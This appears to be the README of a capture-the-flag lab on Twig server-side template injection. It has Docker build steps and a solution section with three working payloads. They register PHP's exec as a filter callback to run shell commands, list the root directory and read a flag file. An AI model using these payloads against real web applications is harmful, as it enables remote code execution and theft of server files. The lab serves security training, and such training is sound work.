# Twig Template injection

## Build instructions

Requirements:
 - Docker
 - Docker-compose

```
docker-compose up
```

## Solution

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo -E `ls /`")}}
```

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo -E `cat /secret/flag_twigtwig.txt`")}}
```
